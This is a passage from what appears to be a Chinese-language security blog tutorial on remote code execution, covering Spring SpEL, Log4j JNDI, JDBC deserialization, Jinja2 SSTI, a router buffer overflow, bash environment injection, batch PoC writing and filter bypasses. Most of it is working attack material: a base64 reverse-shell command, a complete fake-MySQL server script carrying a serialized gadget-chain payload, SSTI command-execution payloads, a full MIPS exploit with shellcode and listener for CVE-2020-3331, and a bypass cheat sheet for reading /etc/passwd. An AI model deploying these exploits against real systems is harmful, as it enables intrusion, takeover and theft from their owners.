![图片](https://images.seebug.org/content/images/2022/07/11/1657512478000-157xsduu.png-w331s)

![图片](https://images.seebug.org/content/images/2022/07/11/1657512478000-158mzcon.png-w331s)

![图片](https://images.seebug.org/content/images/2022/07/11/1657512478000-159lukqv.png-w331s)

后面就是反弹shell了，网上文章较多，大家自行测试

T(java.lang.Runtime).getRuntime().exec("bash -c
{echo,base64加密的shell}|{base64,-d}|{bash,-i}")

原理分析，参考（https://www.t00ls.cc/thread-65356-1-1.html）

这里获取post，然后将参数转到processRequest

![图片](https://images.seebug.org/content/images/2022/07/11/1657512479000-160taejb.png-w331s)

往下跟进processRequest

![图片](https://images.seebug.org/content/images/2022/07/11/1657512479000-161pdnza.png-w331s)

注意这里是header，这也是为啥payload在header中传输

![图片](https://images.seebug.org/content/images/2022/07/11/1657512480000-162kthfe.png-w331s)

然后跟进apply进去

![图片](https://images.seebug.org/content/images/2022/07/11/1657512480000-163uwzrw.png-w331s)

传进来的数据跟进doApply，在进去doApply方法看

![图片](https://images.seebug.org/content/images/2022/07/11/1657512480000-164tbuni.png-w331s)

跟进apply

![图片](https://images.seebug.org/content/images/2022/07/11/1657512480000-165rjkwc.png-w331s)

发现参数到了route,在跟进route

![图片](https://images.seebug.org/content/images/2022/07/11/1657512480000-166fucst.png-w331s)

判断请求头有没有spring那段，如果有的话就进入到functionFromExpression里代入，那我们进去这个函数看一下

![图片](https://images.seebug.org/content/images/2022/07/11/1657512481000-167mvqbg.png-w331s)

跟开头一样，这里的parseExpression直接带入进来解析，所以也就成功的rce了

## **12 JNDI注入**

![图片](https://images.seebug.org/content/images/2022/07/11/1657512481000-168wztnt.png-w331s)

这里的jndiName可控，我们就可以直接造成Rce

“RMI（Remote Method Invocation），是一种跨JVM实现方法调用的技术。

在RMI的通信方式中，由以下三个大部分组成：

Client

Registry

Server

其中Client是客户端，Server是服务端，而Registry是注册中心。

客户端会Registry取得服务端注册的服务，从而调用服务端的远程方法。

注册中心在RMI通信中起到了一个什么样的作用？我们可以把他理解成一个字典，一个负责网络传输的模块。

服务端在注册中心注册服务时，需要提供一个key以及一个value，这个value是一个远程对象，Registry会对这个远程对象进行封装，使其转为一个远程代理对象。当客户端想要调用远程对象的方法时，则需要先通过Registry获取到这个远程代理对象，使用远程代理对象与服务端开放的端口进行通信，从而取得调用方法的结果。”

Jndi注入最知名的案例应该就是log4j了

原理分析

解开jar包

![图片](https://images.seebug.org/content/images/2022/07/11/1657512481000-169emsqv.png-w331s)

入口

![图片](https://images.seebug.org/content/images/2022/07/11/1657512482000-170qlony.png-w331s)

主要是127-132这段

127逻辑进去后，129行判断字符串中是否包含 ${ 如果包含，就将从这个字符开始一直到字符串结束替换为下面的值，然后就是132替换值的地方

跟进getStrSubstitutor()

![图片](https://images.seebug.org/content/images/2022/07/11/1657512482000-171nzycn.png-w331s)

![图片](https://images.seebug.org/content/images/2022/07/11/1657512482000-172kslig.png-w331s)

## **13 JDBC反序列化**

Java还有一种独有的RCE方法就是JDBC可控配合反序列化的RCE

官网下载8.0.12版本：https://downloads.mysql.com/archives/c-j/

看着两个参数组成的payload

![图片](https://images.seebug.org/content/images/2022/07/11/1657512482000-173crgcu.png-w331s)

官方介绍

![图片](https://images.seebug.org/content/images/2022/07/11/1657512482000-174tbcal.png-w331s)

![图片](https://images.seebug.org/content/images/2022/07/11/1657512483000-175ogzki.png-w331s)

queryInterceptors：一个逗号分割的Class列表（实现了com.mysql.cj.interceptors.QueryInterceptor接口的类），在Query”之间”进行执行来影响结果。（效果上来看是在Query执行前后各插入一次操作）；

autoDeserialize：自动检测与反序列化存在BLOB字段中的对象；

设置为com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor这个类之后，每次执行查询语句，都会调用拦截器的preProcess和postProcess方法

看到

\mysql-connector-java-8.0.12\src\main\user-impl\java\com\mysql\cj\jdbc\interceptors\ServerStatusDiffInterceptor.java

文件中的preProcess里的populateMapWithSessionStatusValues，跟进这个函数

![图片](https://images.seebug.org/content/images/2022/07/11/1657512483000-176pxkuf.png-w331s)

跟进去之后发现先执行了show session status，然后传到resultSeToMap中，跟进这个函数

![图片](https://images.seebug.org/content/images/2022/07/11/1657512483000-177stpum.png-w331s)

我们可以看到在resultSeToMap中出现了getObject

![图片](https://images.seebug.org/content/images/2022/07/11/1657512483000-178npigs.png-w331s)

这里跟进的是

\mysql-connector-java-8.0.12\src\main\user-impl\java\com\mysql\cj\jdbc\result\ResultSetImpl.java

![图片](https://images.seebug.org/content/images/2022/07/11/1657512484000-179cfmrv.png-w331s)

可以看到try语句中存在readObject

最后贴上 Tri0mphe7师傅的脚本

    
    
    # -*- coding:utf-8 -*-    #@Time : 2020/7/27 2:10
    #@Author: Tri0mphe7
    #@File : server.py
    import socket
    import binascii
    import os
    
    greeting_data="4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400"
    response_ok_data="0700000200000002000000"
    
    def receive_data(conn):
        data = conn.recv(1024)
        print("[*] Receiveing the package : {}".format(data))
        return str(data).lower()
    
    def send_data(conn,data):
        print("[*] Sending the package : {}".format(data))
        conn.send(binascii.a2b_hex(data))
    
    def get_payload_content():
    //file文件的内容使用ysoserial生成的 使用规则  java -jar ysoserial [common7那个]  "calc" > a
        file= r'a'
        if os.path.isfile(file):
            with open(file, 'rb') as f:
                payload_content = str(binascii.b2a_hex(f.read()),encoding='utf-8')
            print("open successs")
    
        else:
            print("open false")
            #calc
    payload_content='aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878'
        return payload_content
    
    # 主要逻辑
    def run():
    
        while 1:
            conn, addr = sk.accept()
            print("Connection come from {}:{}".format(addr[0],addr[1]))
            # 1.先发送第一个问候报文
            send_data(conn,greeting_data)
    
            while True:
                # 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok
                receive_data(conn)
                send_data(conn,response_ok_data)
                #其他过程
                data=receive_data(conn)
                #查询一些配置信息,其中会发送自己的 版本号
                if "session.auto_increment_increment" in data:
    _payload='01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000'
                    send_data(conn,_payload)
                    data=receive_data(conn)
                elif "show warnings" in data:
     _payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000'
                    send_data(conn, _payload)
                    data = receive_data(conn)
                if "set names" in data:
                    send_data(conn,response_ok_data)
                    data = receive_data(conn)
                if "set character_set_results" in data:
                    send_data(conn,response_ok_data)
                    data = receive_data(conn)
                if "show session status" in data:
                    mysql_data = '0100000102'
                    mysql_data += '1a000002036465660001630163016301630c3f00ffff0000fc9000000000'
                    mysql_data += '1a000003036465660001630163016301630c3f00ffff0000fc9000000000'
                    # 为什么我加了EOF Packet 就无法正常运行呢？？
                    //获取payload
                    payload_content=get_payload_content()
                    //计算payload长度
                    payload_length = str(hex(len(payload_content)//2)).replace('0x', '').zfill(4)
                    payload_length_hex = payload_length[2:4] + payload_length[0:2]
                    //计算数据包长度
                    data_len = str(hex(len(payload_content)//2 + 4)).replace('0x', '').zfill(6)
                    data_len_hex = data_len[4:6] + data_len[2:4] + data_len[0:2]
                    mysql_data += data_len_hex + '04' + 'fbfc'+ payload_length_hex
                    mysql_data += str(payload_content)
                    mysql_data += '07000005fe000022000100'
                    send_data(conn, mysql_data)
                    data = receive_data(conn)
                if "show warnings" in data:
                    payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000'
                    send_data(conn, payload)
                break
    
    if __name__ == '__main__':
         HOST ='0.0.0.0'
         PORT = 3309
    
         sk = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         #当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间
         sk.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
         sk.bind((HOST, PORT))
         sk.listen(1)
    
         print("start fake mysql server listening on {}:{}".format(HOST,PORT))
    
         run()

## **14 SSTI注入**

除了这些还有一种rce非常的少见，就是ssti注入到rce

简单demo

![图片](https://images.seebug.org/content/images/2022/07/11/1657512484000-180yhtlj.png-w331s)

![图片](https://images.seebug.org/content/images/2022/07/11/1657512484000-181ecdct.png-w331s)

我们可以看到计算成功，那么就证明这个点是存在ssti注入的

![图片](https://images.seebug.org/content/images/2022/07/11/1657512484000-182gzlej.png-w331s)

用网上的脚本跑一下payload

![图片](https://images.seebug.org/content/images/2022/07/11/1657512484000-183xtfkw.png-w331s)

    
    
    from flask import Flask
    from jinja2 import Template
    
    searchList = ['__init__', "__new__", '__del__', '__repr__', '__str__','__bytes__', '__format__', '__lt__', '__le__', '__eq__', '__ne__', '__gt__','__ge__', '__hash__', '__bool__', '__getattr__', '__getattribute__','__setattr__', '__dir__', '__delattr__', '__get__', '__set__', '__delete__','__call__', "__instancecheck__", '__subclasscheck__', '__len__','__length_hint__', '__missing__','__getitem__', '__setitem__','__iter__','__delitem__', '__reversed__', '__contains__', '__add__','__sub__','__mul__']
    neededFunction = ['eval', 'open', 'exec']
    pay = int(input("Payload?[1|0]"))
    for index, i in enumerate({}.__class__.__base__.__subclasses__()):
         for attr in searchList:
              if hasattr(i, attr):
                  if eval('str(i.'+attr+')[1:9]') == 'function':
                      for goal in neededFunction:
                          if (eval('"'+goal+'" in i.'+attr+'.__globals__["__builtins__"].keys()')):
                             if pay != 1:
                                  print(i.__name__,":", attr, goal)
                             else:
                                  print("{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='" + i.__name__ + "' %}{{ c." + attr + ".__globals__['__builtins__']." + goal + "(\"[evil]\")}}{% endif %}{% endfor %}")

我们从output里随便抽一个payload

例如第一行这个

![图片](https://images.seebug.org/content/images/2022/07/11/1657512485000-184zatrj.png-w331s)

    
    
    {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='_ModuleLock' %}{{c.__init__.__globals__['__builtins__'].eval("print('ZACTEST')") }}{%endif %}{% endfor %}

然后打开我们的web服务，就是最开始的demo

![图片](https://images.seebug.org/content/images/2022/07/11/1657512485000-185ylyqo.png-w331s)

打进去payload，我们可以看到成功print输出ZACTEST

![图片](https://images.seebug.org/content/images/2022/07/11/1657512485000-186zkyel.png-w331s)

使用os模块执行whoami

    
    
    http://127.0.0.1:5000/?name={%for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()")}}{% endif %}{% endfor %}

![图片](https://images.seebug.org/content/images/2022/07/11/1657512485000-187vrffd.png-w331s)

## **15 缓冲区溢出**

因为我并不是玩pwn的，所以对缓冲区溢出RCE几乎完全不懂，以下就直接把大佬文章搬过来（已经得到授权）原文链接出处：

https://ret2w1cky.com/2021/11/12/RV110W%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/

假设我们已经通过类似固件解包，串口通信等方法获取了路由器的固件等我们可以尝试通过寻找已知的CVE来定位可能的rce,这里是寻找到了CVE-2020-3331这个漏洞。

由于并没有对于漏洞点的一个精确定位 我们现在要一点一点的摸索；首先，在上面的Nmap
扫描中，我们知道网站是开放了443端口的。因此，上内部服务器之后netstat确定文件是最好的方式了。但是，因为某一些原因，其中的netstst命令可能因为版本过低没有办法使用一些参数，所以，我决定开个http服务器，把高等级的busybox传上去

![图片](https://images.seebug.org/content/images/2022/07/11/1657512486000-188gjxjn.png-w331s)

可以看到，443端口绑定的正是httpd文件，现在我们已经可以确定漏洞文件了，现在只需要查找漏洞的函数了

这时候，我们就可以使用diff查找也就是查找两个文件不同的地方，我们使用Bindiff工具, 现在，我们解包新版本的和旧版本进行比对：

![图片](https://images.seebug.org/content/images/2022/07/11/1657512486000-189dnant.png-w331s)

这里 可以说越红就代表差异越大 但是 你越往下看就会发现唯一这个guest_logout_cgi和web有点关系 右键这个函数 View flow
graph

![图片](https://images.seebug.org/content/images/2022/07/11/1657512486000-190ncval.png-w331s)

嗯 随便一看就可以看到这里有个高风险函数`sscanf` 地址在`0x431ba8`

其中sscanf的条件"%[^;];% _[^=]=%[^\n]"里，% 表示选择，%_ 表示过滤，中括号括起来的是类似正则

%[^;]：分号前的所有字符都要

%*[^=]：分号后，等号前的字符都不要

%[^\n]：等号后，换行符前的所有字符都要

也就是说，如果输入字符串”aaa;bbb=ccc”，会将aaa和ccc写入对应变量，并没有限制长度，会导致栈溢出

找到了这段代码 我们现在要对伪代码进行分析 看看需要达到那些分支才能达到`sscanf函数`

![图片](https://images.seebug.org/content/images/2022/07/11/1657512486000-191dunat.png-w331s)

通过查阅函数 可以知道我们需要让...

  * cmac：mac格式
  * cip：ip格式
  * submit_button：包含status_guestnet.asp

现在知道了页面是`/guest_logout.cgi`了 需要达成这些条件 那么 我们就可以开始试图溢出了 exp如下 ：

    
    
    import requests
    url = "https://192.168.1.1/guest_logout.cgi"
    payload = {"cmac":"12:af:aa:bb:cc:dd","submit_button":"status_guestnet.asp"+'a'*100,"cip":"192.168.1.100"}

其中 我们还需要确定是用get 还是 post进行攻击 具体还是自己试一试吧 最后会发现只有post攻击下 web后台会转圈圈 所以可以确定是
post攻击方法

gdb-server 我们内部使用

https://gitee.com/h4lo1/HatLab_Tools_Library/tree/master/%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%A8%

使用wget 下载到 /tmp目录 通过上一次的`netstat`扫描 确定进程号 并且绑定进程号 格式如下:

./gdb.server :<绑定端口> \--attach <绑定进程>

在exp上 我利用cyclic脚本来确定溢出点

exp如下：

    
    
    import requests
    import requests
    payload = 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
    #(cyclic 200)
    url = "https://10.10.10.1/guest_logout.cgi"
    payload = {"cmac":"12:af:aa:bb:cc:dd","submit_button":"status_guestnet.asp"+payload,"cip":"192.168.1.100"}
    requests.packages.urllib3.disable_warnings()
    requests.post(url, data=payload, verify=False, timeout=1)

打开gdb multiarch 这样设置

![图片](https://images.seebug.org/content/images/2022/07/11/1657512486000-192frula.png-w331s)

#(记得按c)

![图片](https://images.seebug.org/content/images/2022/07/11/1657512487000-193dtioa.png-w331s)

发送exp后 成功 确定了溢出点为 aaaw 通过 cyclic -l 查询 发现为85

现在 我们就可以准备构造语句了

**ROP Get shell**

mips架构硬件并不支持nx，所以利用方式通常为劫持程序流执行shellcode

由于sscanf栈溢出，所以不能有空字节，而程序本身的gadget都是有空字节的。。。

这时候自然想到用libc的gadget，但是，比较诡异的一点是，它的libc基址每次都不变

这里 我们可以通过`cat /proc/<pid>/maps`查看

所以 我们就要通过ret2libc的方式getshell 我们选择/lib/libc.so.0

利用mipsgadget 发现两条有用的gadgets

| 0x000257A0 | addiu sp,0x58+var_40 | jalr $s0 |

| 0x0003D050 | move a0 | jalr $a0 |

这样会造成什么效果呢？程序返回时，程序执行流被控制为0x257a0，去执行第一条gadget，a0 = sp +
0x18，jmp到s0寄存器，s0寄存器存的是第二条gadget，继而去执行第二条gadget，将a0放到t9，然后jmp到a0，a0存的是shellcode的地址，于是程序就会执行shellcode

**Shellcode**

我们shellcode用 msfvenom 不会生产空字节

![图片](https://images.seebug.org/content/images/2022/07/11/1657512487000-194dtgkq.png-w331s)

那么小伙伴可能要问了 _那s0寄存器地址怎么算呢？_

其实 只要用我们第一次算溢出的图用 cyclic算就行了 也就是`cyclic -l aaan`

![图片](https://images.seebug.org/content/images/2022/07/11/1657512487000-195mpvnf.png-w331s)

Exp:

    
    
    import requests
    from pwn import *
    p = listen(8788)
    context.arch = 'mips'
    context.endian = 'little'
    context.os = 'linux'
    
    libc = 0x2af98000
    jmp_a0 = libc + 0x0003D050 # move  $t9,$a0; jalr  $a0
    jmp_s0 = libc + 0x000257A0 # addiu  $a0,$sp,0x38+var_20 ; jalr  $s0 (var_20) = -20
    buf = b""
    buf += b"\xfa\xff\x0f\x24\x27\x78\xe0\x01\xfd\xff\xe4\x21\xfd"
    buf += b"\xff\xe5\x21\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x01"
    buf += b"\x01\x01\xff\xff\xa2\xaf\xff\xff\xa4\x8f\xfd\xff\x0f"
    buf += b"\x34\x27\x78\xe0\x01\xe2\xff\xaf\xaf\x22\x54\x0e\x3c"
    buf += b"\x22\x54\xce\x35\xe4\xff\xae\xaf\x01\x65\x0e\x3c\xc0"
    buf += b"\xa8\xce\x35\xe6\xff\xae\xaf\xe2\xff\xa5\x27\xef\xff"
    buf += b"\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24\x0c\x01\x01"
    buf += b"\x01\xfd\xff\x11\x24\x27\x88\x20\x02\xff\xff\xa4\x8f"
    buf += b"\x21\x28\x20\x02\xdf\x0f\x02\x24\x0c\x01\x01\x01\xff"
    buf += b"\xff\x10\x24\xff\xff\x31\x22\xfa\xff\x30\x16\xff\xff"
    buf += b"\x06\x28\x62\x69\x0f\x3c\x2f\x2f\xef\x35\xec\xff\xaf"
    buf += b"\xaf\x73\x68\x0e\x3c\x6e\x2f\xce\x35\xf0\xff\xae\xaf"
    buf += b"\xf4\xff\xa0\xaf\xec\xff\xa4\x27\xf8\xff\xa4\xaf\xfc"
    buf += b"\xff\xa0\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24\x0c\x01"
    buf += b"\x01\x01"
    
    payload1 = "status_guestnet.asp"
    payload1 += 'a' * 49 + p32(jmp_a0) # control $s0
    payload1 += (85 - 49 - 4) * 'a' + p32(jmp_s0) # control gadgets2 , retuen to jmp_s0
    payload1 += 'a' * 18 + buf # control $sp + 18
    url = "https://192.168.1.1/guest_logout.cgi"
    payload2 = {
       "cmac":"12:af:aa:bb:cc:dd",
       "submit_button": payload1,
       "cip":"192.168.1.100"
    }
    requests.packages.urllib3.disable_warnings() #Hide warnings
    requests.post(url, data=payload2, verify=False,timeout=1)
    p.wait_for_connection()
    log.success("getshell")
    p.interactive()

成功getshell

![图片](https://images.seebug.org/content/images/2022/07/11/1657512487000-196mmmbx.png-w331s)

## **16 php环境变量注入**

某次在P牛的知识星球划水，发现了一个很骚的思路如下

![图片](https://images.seebug.org/content/images/2022/07/11/1657512487000-197cebdh.png-w331s)

我们可以看到两个点，putenv，传入的参数envs和最后的不可控变量system

![图片](https://images.seebug.org/content/images/2022/07/11/1657512487000-198aeawd.png-w331s)

这篇文章已经说得很详细了

https://tttang.com/archive/1450/

所以这里只是简单总结，如果想深入研究可以看看这篇帖子

下载源码然后看到这个文件\glibc-2.31\libio\iopopen.c，我们可以在89行看到的执行sh -c，加上p牛的那段代码，最终输出的是sh
-c echo hello

![图片](https://images.seebug.org/content/images/2022/07/11/1657512488000-199vmudd.png-w331s)

Readfile的目的是读取SHELL中的profile文件

![图片](https://images.seebug.org/content/images/2022/07/11/1657512488000-200xybss.png-w331s)

![图片](https://images.seebug.org/content/images/2022/07/11/1657512488000-201cxzzf.png-w331s)

然后我们可以看到这段代码的257行，name被expandstr解析

![图片](https://images.seebug.org/content/images/2022/07/11/1657512488000-202evncf.png-w331s)

文章里说，iflag经过分析是表示是否传入-i参数，然后我溯源的时候发现应该是在\dash-0.5.10.2\src\options.h文件和\dash-0.5.10.2\src\options.c文件中定义的

![图片](https://images.seebug.org/content/images/2022/07/11/1657512488000-203enllj.png-w331s)

![图片](https://images.seebug.org/content/images/2022/07/11/1657512489000-204apxjo.png-w331s)

所以后面传参过去-i -c就可以了

    
    
    ENV='$(id1>&2)' dash -i -c 'echo hello'

最后经过大佬的分析，在文件variables.c这段代码中

![图片](https://images.seebug.org/content/images/2022/07/11/1657512489000-205yolrd.png-w331s)

Parse_and_execute执行temp_string

我们可以在bash-4.4-beta2\bash-4.4-beta2\builtins\evalstring.c文件看到该函数

![图片](https://images.seebug.org/content/images/2022/07/11/1657512489000-206mpvhz.png-w331s)

不过其实哪怕看其他几个传参点也能知道parse_and_excute执行的就是shell命令

![图片](https://images.seebug.org/content/images/2022/07/11/1657512489000-207emked.png-w331s)

最后以p牛给的几个途径完结

BASH_ENV：可以在bash -c的时候注入任意命令

ENV：可以在sh -i -c的时候注入任意命令

PS1：可以在sh或bash交互式环境下执行任意命令

PROMPT_COMMAND：可以在bash交互式环境下执行任意命令

BASH_FUNC_xxx%%：可以在bash -c或sh -c的时候执行任意命令

    
    
    env 'BASH_FUNC_echo()=() { id; }' bash -c "echo hello"

![图片](https://images.seebug.org/content/images/2022/07/11/1657512489000-208natqi.png-w331s)

当然除了这种，还有个LD_PRELOAD，我这里就不复现了，感兴趣的可以看看

<http://www.hackdig.com/01/hack-572721.htm>

## **17 POC/EXP编写**

RCE的原理大家基本都懂了，但比如挖到了0day，基本都是几千个站及以上了，如果刷分的话手测得累死，所以需要自己开发poc进行批量探测

这里先拿一个简单的get传参的rce来写

用一个小0day来做示范，如下

![图片](https://images.seebug.org/content/images/2022/07/11/1657512490000-209xjqmd.png-w331s)

利用payload

    
    
    /data/manage/cmd.php?cmd=whoami

![图片](https://images.seebug.org/content/images/2022/07/11/1657512490000-210awpwb.png-w331s)

可以看到成功回显

![图片](https://images.seebug.org/content/images/2022/07/11/1657512490000-211eucvu.png-w331s)

那么思路就很清晰了，rce直接用输出的数据，然后判断返回包是否存在，导入request包，然后传参，判断返回包是否存在我们想要的

![图片](https://images.seebug.org/content/images/2022/07/11/1657512490000-212eyjyc.png-w331s)

Exp编写如下：

我们可以看到< br >< pre >后面使我们的命令回显，那么我们之前的字符都不需要，所以print出下标和整个html代码

![图片](https://images.seebug.org/content/images/2022/07/11/1657512490000-213ejkqi.png-w331s)

我们可以看到我们的命令回显在< 这里开头后的第九个位置，于是取到下标b，从下标b开始到最后的都是我们的命令回显，那么就可以轻而易举的写出来exp

![图片](https://images.seebug.org/content/images/2022/07/11/1657512490000-214nquwd.png-w331s)

当然这只是get的方法，那么post的poc/exp该如何编写呢？两者差不多，区别就在于该如何传参

这里拿出一个某网关的rce做案例，可以看到，判断flag是否等于1，如果等于1就直接拼接参数sipdev，然后exec无过滤直接输出

![图片](https://images.seebug.org/content/images/2022/07/11/1657512490000-215qohgz.png-w331s)

然后漏洞复现，因为这时候我的burp突然坏了，所以用google的hackbar来利用，就是没burp直接看返回包方便

![图片](https://images.seebug.org/content/images/2022/07/11/1657512491000-216pemrk.png-w331s)

成功RCE

![图片](https://images.seebug.org/content/images/2022/07/11/1657512491000-217bnrhy.png-w331s)

![图片](https://images.seebug.org/content/images/2022/07/11/1657512491000-218luotf.png-w331s)

简单poc编写

![图片](https://images.seebug.org/content/images/2022/07/11/1657512491000-219gjrlz.png-w331s)

简单exp编写

![图片](https://images.seebug.org/content/images/2022/07/11/1657512491000-220yhtsr.png-w331s)

如果批量的话只需要同目录建一个url.txt，然后with open打开遍历就行了，网上文章很多很基础，这里就不做演示了

## **18 Bypass笔记**

基本案例就这些了，最后在加上一些RCEbypass的方法（本人java并不是很好，所以这里只有php和shell系统命令之类的），有些复现过有些没复现，可自行测试，可能不是很全，也欢迎大佬联系我进行补充

1.变量bypass

a=c;b=a;c=t;

b$c /etc/passwd

2.16编码绕过

"\x73\x79\x73\x74\x65\x6d"("cat /etc/passwd");

3.oct编码绕过

$(printf "\154\163")//ls命令

4.拼接绕过

sy.(st).em(whoami);//

c''a''t /etc/passwd//单引

c""a""t /etc/passwd//双引

c``a``t /etc/passwd/反单引

c\a\t /etc/passwd//反斜线

@，{x}(x>=10) :比如ca${21}t a.txt表示cat a.txt 在没有传入参数的情况下,这些特殊字符默认为空,如下:

wh$1oami

who$@ami

whoa$*mi

5.利用未赋值变量绕过

cat /etc$u/passwd

cat$u /etc/passwd

6.通配符绕过

cat /passwd：

??? /e??/?a????

cat /e _/pa_

7.base编码绕过

echo 'Y2F0wqAK' | base64 -d '1.txt'

8.过滤分割符 | & ；

; //分号

| //只执行后面那条命令

|| //只执行前面那条命令

& //两条命令都会执行

&& //两条命令都会执行

%0a //换行符

%0d //回车符号

用?>代替；

在php中可以用?>来代替最后的一个；，因为php遇到定界符关闭标签会自动在末尾加上一个分号

9.远程下载/复制绕过

Copy，wget，curl等函数，不直接写入文件，而是远程下载来保存文件

当然除了这些肯定还有很多绕过方法，不过本篇文章不着重于此处，可自行搜索

文章中部分是互联网的案例与素材，上上下下看了快几百个网站进行资料查找，问了很多大佬，全程自己打字写所以肯定会有错误，看到有技术性错误私聊我进行修改or删除，因为参考站点太多了，这里就不一一写引用了，如有侵权请私信我修改or删除

* * *

